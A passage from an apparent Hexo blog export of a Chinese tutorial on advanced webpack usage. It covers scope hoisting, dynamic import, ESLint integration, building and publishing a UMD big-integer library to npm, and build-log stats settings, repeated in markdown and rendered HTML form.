test: /\\.(js|jsx)$/,\n                exclude: /node_modules/,\n                use: ['babel-loader', {\n                    loader: 'eslint-loader',\n                    options: {\n                        fix: true\n                    }\n                }]\n            }\n        ]\n    }\n}\n```\n\n## webpack 打包组件和基础库\n\nwebpack 除了可以用来打包应用，也可以用来打包 js 库，当然可能打包 js 库用 rollup 更适合。本次以实现一个大整数加法库为例讲下实现过程。\n\n要求：\n\n- 需要打包压缩版 large-number-jovy.min.js 和非压缩版本 large-number-jovy.js；\n- 支持 AMD/CJS/ESM 模块引入和 Script 标签引入；\n\n目录结构：\n![large-number项目结构图](large-number.jpg)\n\n安装配置：\n\n```shell\nnpm i terser-webpack-plugin -D\n```\n\n```js\nconst TerserPlugin = require('terser-webpack-plugin');\n\nmodule.exports = {\n  mode: 'none',\n  entry: {\n    'large-number-jovy': './src/index.js',\n    'large-number-jovy.min': './src/index.js'\n  },\n  output: {\n    filename: '[name].js',\n    library: 'largeNumberJovy', //指定库的全局变量\n    libraryExport: 'default',\n    libraryTarget: 'umd' //支持库引入的方式\n  },\n  optimization: {\n    minimize: true,\n    minimizer: [\n      new TerserPlugin({\n        include: /\\.min\\.js$/\n      })\n    ]\n  }\n};\n```\n\n设置入口文件：\n\npackage.json 的 main 字段为 index.js\n\n```js\n// index.js\nif (process.env.NODE_ENV === 'production') {\n  module.exports = require('./dist/large-number-jovy.min.js');\n} else {\n  module.exports = require('./dist/large-number-jovy.js');\n}\n```\n\n发布：\n_默认已经在 npm 注册了账号，并且登录了，否则请先注册登录。_\n\n```shell\nnpm publish\n```\n\n查看：\n![large-number发布成功图](large-number2.jpg)\n\n使用：\n\n```shell\n# 安装\nnpm i large-number-jovy -S\n```\n\n```js\n// react\nimport LargeNumber from 'large-number-jovy';\n...\n{LargeNumber('999999', '1')}\n```\n\n## 优化构建时命令行的显示日志\n\n每次构建命令行都会显示很多日志信息，我们是不是可以定制显示信息呢？例如只显示错误日志。答案是当然可以，了解下[stats](https://webpack.docschina.org/configuration/stats/#src/components/Sidebar/Sidebar.jsx)配置项。stats 值为 String 或者 Object，字符串值是内置的一套规则的名称，有如下几种：\n\n- error-only：只在发生错误时输出\n- minimal：只在发生错误或有新的编译时输出\n- none：没有输出\n- normal：标准输出\n- verbose：全部输出\n\n```js\n// webpack.config.js\n// 对于 webpack-dev-server，这个属性要放在 devServer 对象里。\nmodule.exports = {\n  //...\n  stats: 'errors-only'\n};\n```\n\n当然更详细配置可以用对象来罗列具体每条规则。\n\n```js\n// webpack.config.js\n\nmodule.exports = {\n  //..\n  stats: {\n    // copied from `'minimal'`\n    all: false,\n    modules: true,\n    maxModules: 0,\n    errors: true,\n    warnings: true,\n    // our additional options\n    moduleTrace: true,\n    errorDetails: true\n  }\n};\n```\n\n实际使用中，我们发现内置的过于简单，详细配置又过于繁琐，有没有更加友好的插件呢？\n\n### `friendly-errors-webpack-plugin`的使用\n\n```js\n// webpack.config.js\nmodule.exports = {\n  // ..\n  plugins: [new FriendlyErrorsWebpackPlugin()],\n  stats: 'errors-only'\n};\n```\n\n使用后效果：\n![friendly-errors-webpack-plugin使用效果图](error.jpg)\n\n# 参考\n\n《极客时间》\n","source":"_posts/2019/09/webpack进阶用法二.md","raw":"---\ntitle: webpack进阶用法二\npermalink: webpack-advance-2\ntags:\n  - webpack\ncategories:\n  - 工具\ndate: 2019-09-17 10:19:55\nupdated: 2019-09-17 10:19:55\n---\n\n# 概述\n\n本文介绍的 webpack 用法有：Scope Hosting 的使用和原理分析。\n\n<!-- more -->\n\n# 详述\n\n## Scope Hosting 的使用和原理分析\n\n### 构建后的代码存在大量闭包代码\n\n大量作用域包裹代码，导致体积增大（模块越多越明显）；运行代码时创建的函数作用域变多，内存开销变大。\n![](scope-hoisting.jpg)\n\n### webpack 的模块机制\n\n![](module.jpg)\n\n### 原理\n\n将所有模块的代码按照引用顺序放在一个函数作用域里，然后适当的重命名一些变量以防止变量名冲突。\n\n### 使用\n\n要求必须是 ES6 语法（原因同上一篇 tree shaking），CommonJS 不支持。若是 webpack4.x 设置 mode 为 production 后默认开启，之前版本及其他模式需要显式引用`ModuleConcatenationPlugin`插件，示例如下：\n\n<!-- webpack.config.js -->\n\n```js\nconst webpack = require('webpack')\nmodule.exports = {\n  ...\n  plugins: [new webpack.optimize.ModuleConcatenationPlugin()]\n};\n```\n\n## 代码分割和动态 import\n\n对于大的 web 应用，把所有代码放到一个文件显然不合适，一般会根据需要进行分割。常见处理方式有：提出公共代码，见上一篇“提取页面公共资源”部分；脚本懒加载，使得初始加载的代码更小。\n\n### 懒加载 JS 方式\n\n- CommonJS：require.ensure\n- ES6：动态 import（目前还没有原生支持，需要 babel 转换）\n\n### 动态 import\n\n#### 安装配置：\n\n```shell\nnpm install @babel/plugin-syntax-dynamic-import -D\n```\n\n```json\n// .babelrc\n{\n  \"presets\": [\"@babel/preset-env\", \"@babel/preset-react\"],\n  \"plugins\": [\"@babel/plugin-syntax-dynamic-import\"]\n}\n```\n\n#### 打包后效果示例：\n\n![](import.jpg)\n\n#### 懒加载使用示例：\n\n```js\n// text.js\nimport React from 'react';\n\nexport default () => <div>动态 import</div>;\n```\n\n```js\n// index.js\n'use strict';\n\nimport React from 'react';\nimport ReactDOM from 'react-dom';\nimport '../../common/index';\nimport logo from './images/logo.png';\nimport './search.less';\n\nclass Search extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      Text: null\n    };\n  }\n\n  loadComponent() {\n    import('./text.js').then(textModule => {\n      this.setState({\n        Text: textModule.default\n      });\n    });\n  }\n  render() {\n    const { Text } = this.state;\n    return (\n      <div className='search-text'>\n        {Text ? <Text></Text> : null}\n        搜索文字的内容\n        <img src={logo} onClick={this.loadComponent.bind(this)} />\n      </div>\n    );\n  }\n}\n\nReactDOM.render(<Search />, document.getElementById('root'));\n```\n\n## 在 webpack 中使用 ESLint\n\n以下以基于 Airbnb 的 eslint 规则库的使用为例\n\n### 安装依赖包\n\n```shell\n# airbnb的eslint规则库\nnpm i eslint-config-airbnb -D\n# airbnb的eslint规则库依赖包\nnpm i eslint eslint-plugin-import eslint-plugin-react eslint-plugin-react-hooks eslint-plugin-jsx-a11y -D\n# eslint解析器\nnpm i babel-eslint -D\n# webpack loader\nnpm i eslint-loader -D\n```\n\n### 配置 eslint 和 webpack\n\n```js\n// .eslintrc.js\nmodule.exports = {\n  parser: 'babel-eslint',\n  extends: 'airbnb',\n  env: {\n    browser: true,\n    node: true\n  },\n  rules: {}\n};\n```\n\n```js\n// webpack.config.js\nmodule.exports = {\n    ...\n    module: {\n        rules: [\n            {\n                test: /\\.(js|jsx)$/,\n                exclude: /node_modules/,\n                use: ['babel-loader', {\n                    loader: 'eslint-loader',\n                    options: {\n                        fix: true\n                    }\n                }]\n            }\n        ]\n    }\n}\n```\n\n## webpack 打包组件和基础库\n\nwebpack 除了可以用来打包应用，也可以用来打包 js 库，当然可能打包 js 库用 rollup 更适合。本次以实现一个大整数加法库为例讲下实现过程。\n\n要求：\n\n- 需要打包压缩版 large-number-jovy.min.js 和非压缩版本 large-number-jovy.js；\n- 支持 AMD/CJS/ESM 模块引入和 Script 标签引入；\n\n目录结构：\n![large-number项目结构图](large-number.jpg)\n\n安装配置：\n\n```shell\nnpm i terser-webpack-plugin -D\n```\n\n```js\nconst TerserPlugin = require('terser-webpack-plugin');\n\nmodule.exports = {\n  mode: 'none',\n  entry: {\n    'large-number-jovy': './src/index.js',\n    'large-number-jovy.min': './src/index.js'\n  },\n  output: {\n    filename: '[name].js',\n    library: 'largeNumberJovy', //指定库的全局变量\n    libraryExport: 'default',\n    libraryTarget: 'umd' //支持库引入的方式\n  },\n  optimization: {\n    minimize: true,\n    minimizer: [\n      new TerserPlugin({\n        include: /\\.min\\.js$/\n      })\n    ]\n  }\n};\n```\n\n设置入口文件：\n\npackage.json 的 main 字段为 index.js\n\n```js\n// index.js\nif (process.env.NODE_ENV === 'production') {\n  module.exports = require('./dist/large-number-jovy.min.js');\n} else {\n  module.exports = require('./dist/large-number-jovy.js');\n}\n```\n\n发布：\n_默认已经在 npm 注册了账号，并且登录了，否则请先注册登录。_\n\n```shell\nnpm publish\n```\n\n查看：\n![large-number发布成功图](large-number2.jpg)\n\n使用：\n\n```shell\n# 安装\nnpm i large-number-jovy -S\n```\n\n```js\n// react\nimport LargeNumber from 'large-number-jovy';\n...\n{LargeNumber('999999', '1')}\n```\n\n## 优化构建时命令行的显示日志\n\n每次构建命令行都会显示很多日志信息，我们是不是可以定制显示信息呢？例如只显示错误日志。答案是当然可以，了解下[stats](https://webpack.docschina.org/configuration/stats/#src/components/Sidebar/Sidebar.jsx)配置项。stats 值为 String 或者 Object，字符串值是内置的一套规则的名称，有如下几种：\n\n- error-only：只在发生错误时输出\n- minimal：只在发生错误或有新的编译时输出\n- none：没有输出\n- normal：标准输出\n- verbose：全部输出\n\n```js\n// webpack.config.js\n// 对于 webpack-dev-server，这个属性要放在 devServer 对象里。\nmodule.exports = {\n  //...\n  stats: 'errors-only'\n};\n```\n\n当然更详细配置可以用对象来罗列具体每条规则。\n\n```js\n// webpack.config.js\n\nmodule.exports = {\n  //..\n  stats: {\n    // copied from `'minimal'`\n    all: false,\n    modules: true,\n    maxModules: 0,\n    errors: true,\n    warnings: true,\n    // our additional options\n    moduleTrace: true,\n    errorDetails: true\n  }\n};\n```\n\n实际使用中，我们发现内置的过于简单，详细配置又过于繁琐，有没有更加友好的插件呢？\n\n### `friendly-errors-webpack-plugin`的使用\n\n```js\n// webpack.config.js\nmodule.exports = {\n  // ..\n  plugins: [new FriendlyErrorsWebpackPlugin()],\n  stats: 'errors-only'\n};\n```\n\n使用后效果：\n![friendly-errors-webpack-plugin使用效果图](error.jpg)\n\n# 参考\n\n《极客时间》\n","slug":"webpack-advance-2","published":1,"_id":"ck0n7m6c90004dkvvr2frhlx8","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>本文介绍的 webpack 用法有：Scope Hosting 的使用和原理分析。</p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"Scope-Hosting-的使用和原理分析\"><a href=\"#Scope-Hosting-的使用和原理分析\" class=\"headerlink\" title=\"Scope Hosting 的使用和原理分析\"></a>Scope Hosting 的使用和原理分析</h2><h3 id=\"构建后的代码存在大量闭包代码\"><a href=\"#构建后的代码存在大量闭包代码\" class=\"headerlink\" title=\"构建后的代码存在大量闭包代码\"></a>构建后的代码存在大量闭包代码</h3><p>大量作用域包裹代码，导致体积增大（模块越多越明显）；运行代码时创建的函数作用域变多，内存开销变大。<br><img src=\"/webpack-advance-2/scope-hoisting.jpg\" alt=\"\"></p>\n<h3 id=\"webpack-的模块机制\"><a href=\"#webpack-的模块机制\" class=\"headerlink\" title=\"webpack 的模块机制\"></a>webpack 的模块机制</h3><p><img src=\"/webpack-advance-2/module.jpg\" alt=\"\"></p>\n<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>将所有模块的代码按照引用顺序放在一个函数作用域里，然后适当的重命名一些变量以防止变量名冲突。</p>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><p>要求必须是 ES6 语法（原因同上一篇 tree shaking），CommonJS 不支持。若是 webpack4.x 设置 mode 为 production 后默认开启，之前版本及其他模式需要显式引用<code>ModuleConcatenationPlugin</code>插件，示例如下：</p>\n<!-- webpack.config.js -->\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> webpack = <span class=\"built_in\">require</span>(<span class=\"string\">'webpack'</span>)</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  plugins: [<span class=\"keyword\">new</span> webpack.optimize.ModuleConcatenationPlugin()]</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"代码分割和动态-import\"><a href=\"#代码分割和动态-import\" class=\"headerlink\" title=\"代码分割和动态 import\"></a>代码分割和动态 import</h2><p>对于大的 web 应用，把所有代码放到一个文件显然不合适，一般会根据需要进行分割。常见处理方式有：提出公共代码，见上一篇“提取页面公共资源”部分；脚本懒加载，使得初始加载的代码更小。</p>\n<h3 id=\"懒加载-JS-方式\"><a href=\"#懒加载-JS-方式\" class=\"headerlink\" title=\"懒加载 JS 方式\"></a>懒加载 JS 方式</h3><ul>\n<li>CommonJS：require.ensure</li>\n<li>ES6：动态 import（目前还没有原生支持，需要 babel 转换）</li>\n</ul>\n<h3 id=\"动态-import\"><a href=\"#动态-import\" class=\"headerlink\" title=\"动态 import\"></a>动态 import</h3><h4 id=\"安装配置：\"><a href=\"#安装配置：\" class=\"headerlink\" title=\"安装配置：\"></a>安装配置：</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install @babel/plugin-syntax-dynamic-import -D</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// .babelrc</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"presets\"</span>: [<span class=\"string\">\"@babel/preset-env\"</span>, <span class=\"string\">\"@babel/preset-react\"</span>],</span><br><span class=\"line\">  <span class=\"attr\">\"plugins\"</span>: [<span class=\"string\">\"@babel/plugin-syntax-dynamic-import\"</span>]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"打包后效果示例：\"><a href=\"#打包后效果示例：\" class=\"headerlink\" title=\"打包后效果示例：\"></a>打包后效果示例：</h4><p><img src=\"/webpack-advance-2/import.jpg\" alt=\"\"></p>\n<h4 id=\"懒加载使用示例：\"><a href=\"#懒加载使用示例：\" class=\"headerlink\" title=\"懒加载使用示例：\"></a>懒加载使用示例：</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// text.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> () =&gt; <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>动态 import<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span>;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// index.js</span></span><br><span class=\"line\"><span class=\"meta\">'use strict'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ReactDOM <span class=\"keyword\">from</span> <span class=\"string\">'react-dom'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">'../../common/index'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> logo <span class=\"keyword\">from</span> <span class=\"string\">'./images/logo.png'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">'./search.less'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Search</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.state = &#123;</span><br><span class=\"line\">      Text: <span class=\"literal\">null</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  loadComponent() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">import</span>(<span class=\"string\">'./text.js'</span>).then(<span class=\"function\"><span class=\"params\">textModule</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">        Text: textModule.default</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> &#123; Text &#125; = <span class=\"keyword\">this</span>.state;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;div className=<span class=\"string\">'search-text'</span>&gt;</span><br><span class=\"line\">        &#123;Text ? <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">Text</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">Text</span>&gt;</span></span> : <span class=\"literal\">null</span>&#125;</span><br><span class=\"line\">        搜索文字的内容</span><br><span class=\"line\">        &lt;img src=&#123;logo&#125; onClick=&#123;<span class=\"keyword\">this</span>.loadComponent.bind(<span class=\"keyword\">this</span>)&#125; /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">ReactDOM.render(&lt;Search /</span>&gt;, <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'root'</span>));</span><br></pre></td></tr></table></figure>\n<h2 id=\"在-webpack-中使用-ESLint\"><a href=\"#在-webpack-中使用-ESLint\" class=\"headerlink\" title=\"在 webpack 中使用 ESLint\"></a>在 webpack 中使用 ESLint</h2><p>以下以基于 Airbnb 的 eslint 规则库的使用为例</p>\n<h3 id=\"安装依赖包\"><a href=\"#安装依赖包\" class=\"headerlink\" title=\"安装依赖包\"></a>安装依赖包</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span> airbnb的eslint规则库</span><br><span class=\"line\">npm i eslint-config-airbnb -D</span><br><span class=\"line\"><span class=\"meta\">#</span> airbnb的eslint规则库依赖包</span><br><span class=\"line\">npm i eslint eslint-plugin-import eslint-plugin-react eslint-plugin-react-hooks eslint-plugin-jsx-a11y -D</span><br><span class=\"line\"><span class=\"meta\">#</span> eslint解析器</span><br><span class=\"line\">npm i babel-eslint -D</span><br><span class=\"line\"><span class=\"meta\">#</span> webpack loader</span><br><span class=\"line\">npm i eslint-loader -D</span><br></pre></td></tr></table></figure>\n<h3 id=\"配置-eslint-和-webpack\"><a href=\"#配置-eslint-和-webpack\" class=\"headerlink\" title=\"配置 eslint 和 webpack\"></a>配置 eslint 和 webpack</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// .eslintrc.js</span></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  parser: <span class=\"string\">'babel-eslint'</span>,</span><br><span class=\"line\">  extends: <span class=\"string\">'airbnb'</span>,</span><br><span class=\"line\">  env: &#123;</span><br><span class=\"line\">    browser: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    node: <span class=\"literal\">true</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  rules: &#123;&#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// webpack.config.js</span></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"built_in\">module</span>: &#123;</span><br><span class=\"line\">        rules: [</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                test: <span class=\"regexp\">/\\.(js|jsx)$/</span>,</span><br><span class=\"line\">                exclude: <span class=\"regexp\">/node_modules/</span>,</span><br><span class=\"line\">                use: [<span class=\"string\">'babel-loader'</span>, &#123;</span><br><span class=\"line\">                    loader: <span class=\"string\">'eslint-loader'</span>,</span><br><span class=\"line\">                    options: &#123;</span><br><span class=\"line\">                        fix: <span class=\"literal\">true</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;]</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"webpack-打包组件和基础库\"><a href=\"#webpack-打包组件和基础库\" class=\"headerlink\" title=\"webpack 打包组件和基础库\"></a>webpack 打包组件和基础库</h2><p>webpack 除了可以用来打包应用，也可以用来打包 js 库，当然可能打包 js 库用 rollup 更适合。本次以实现一个大整数加法库为例讲下实现过程。</p>\n<p>要求：</p>\n<ul>\n<li>需要打包压缩版 large-number-jovy.min.js 和非压缩版本 large-number-jovy.js；</li>\n<li>支持 AMD/CJS/ESM 模块引入和 Script 标签引入；</li>\n</ul>\n<p>目录结构：<br><img src=\"/webpack-advance-2/large-number.jpg\" alt=\"large-number项目结构图\"></p>\n<p>安装配置：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i terser-webpack-plugin -D</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> TerserPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'terser-webpack-plugin'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  mode: <span class=\"string\">'none'</span>,</span><br><span class=\"line\">  entry: &#123;</span><br><span class=\"line\">    <span class=\"string\">'large-number-jovy'</span>: <span class=\"string\">'./src/index.js'</span>,</span><br><span class=\"line\">    <span class=\"string\">'large-number-jovy.min'</span>: <span class=\"string\">'./src/index.js'</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  output: &#123;</span><br><span class=\"line\">    filename: <span class=\"string\">'[name].js'</span>,</span><br><span class=\"line\">    library: <span class=\"string\">'largeNumberJovy'</span>, <span class=\"comment\">//指定库的全局变量</span></span><br><span class=\"line\">    libraryExport: <span class=\"string\">'default'</span>,</span><br><span class=\"line\">    libraryTarget: <span class=\"string\">'umd'</span> <span class=\"comment\">//支持库引入的方式</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  optimization: &#123;</span><br><span class=\"line\">    minimize: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    minimizer: [</span><br><span class=\"line\">      <span class=\"keyword\">new</span> TerserPlugin(&#123;</span><br><span class=\"line\">        include: <span class=\"regexp\">/\\.min\\.js$/</span></span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>设置入口文件：</p>\n<p>package.json 的 main 字段为 index.js</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// index.js</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (process.env.NODE_ENV === <span class=\"string\">'production'</span>) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">module</span>.exports = <span class=\"built_in\">require</span>(<span class=\"string\">'./dist/large-number-jovy.min.js'</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">module</span>.exports = <span class=\"built_in\">require</span>(<span class=\"string\">'./dist/large-number-jovy.js'</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>发布：<br><em>默认已经在 npm 注册了账号，并且登录了，否则请先注册登录。</em></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm publish</span><br></pre></td></tr></table></figure>\n<p>查看：<br><img src=\"/webpack-advance-2/large-number2.jpg\" alt=\"large-number发布成功图\"></p>\n<p>使用：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span> 安装</span><br><span class=\"line\">npm i large-number-jovy -S</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// react</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> LargeNumber <span class=\"keyword\">from</span> <span class=\"string\">'large-number-jovy'</span>;</span><br><span class=\"line\">...</span><br><span class=\"line\">&#123;LargeNumber(<span class=\"string\">'999999'</span>, <span class=\"string\">'1'</span>)&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"优化构建时命令行的显示日志\"><a href=\"#优化构建时命令行的显示日志\" class=\"headerlink\" title=\"优化构建时命令行的显示日志\"></a>优化构建时命令行的显示日志</h2><p>每次构建命令行都会显示很多日志信息，我们是不是可以定制显示信息呢？例如只显示错误日志。答案是当然可以，了解下<a href=\"https://webpack.docschina.org/configuration/stats/#src/components/Sidebar/Sidebar.jsx\" target=\"_blank\" rel=\"noopener\">stats</a>配置项。stats 值为 String 或者 Object，字符串值是内置的一套规则的名称，有如下几种：</p>\n<ul>\n<li>error-only：只在发生错误时输出</li>\n<li>minimal：只在发生错误或有新的编译时输出</li>\n<li>none：没有输出</li>\n<li>normal：标准输出</li>\n<li>verbose：全部输出</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td 